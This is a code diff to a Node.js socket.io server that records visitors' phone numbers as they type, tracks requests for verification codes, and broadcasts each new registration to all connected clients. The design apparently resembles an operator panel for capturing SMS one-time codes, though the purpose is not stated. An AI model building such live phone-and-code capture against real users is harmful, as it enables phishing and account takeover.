@@ -32,7 +32,13 @@ function getOrCreateSession(sessionId) {
 
 function getSubmissionsPayload() {
   const liveSessions = Array.from(sessions.values())
-    .filter(item => item.phone.length > 0 || item.typingStarted || item.codeRequested || item.codeSended)
+    .filter(
+      item =>
+        item.phone.length > 0 ||
+        item.typingStarted ||
+        item.codeRequested ||
+        item.codeSended
+    )
     .sort((a, b) => b.updatedAt - a.updatedAt);
 
   const groupedCodes = {};
@@ -52,6 +58,30 @@ function emitLiveState() {
 
 io.on('connection', (socket) => {
   socket.emit('submissions:update', getSubmissionsPayload());
+
+  socket.on('register:start', ({ sessionId, phone, startedAt } = {}) => {
+    if (!sessionId) return;
+
+    const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
+    const entry = getOrCreateSession(sessionId);
+    const isFirstStart = !entry.typingStarted;
+
+    entry.typingStarted = true;
+    if (cleanPhone && !entry.phone) {
+      entry.phone = cleanPhone;
+    }
+    entry.updatedAt = Date.now();
+
+    if (isFirstStart) {
+      io.emit('user:started-registering', {
+        sessionId,
+        phone: entry.phone || cleanPhone,
+        startedAt: startedAt || Date.now()
+      });
+    }
+
+    emitLiveState();
+  });
 });
 
 app.get('/', (req, res) => {
@@ -68,7 +98,8 @@ app.post('/api/live-update', (req, res) => {
 
   const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
   const entry = getOrCreateSession(sessionId);
-  const wasFirstKeystroke = !entry.typingStarted && (cleanPhone.length > 0 || Boolean(startedTyping));
+  const wasFirstKeystroke =
+    !entry.typingStarted && (cleanPhone.length > 0 || Boolean(startedTyping));
 
   if (entry.phone !== cleanPhone) {
     entry.codeSended = false;
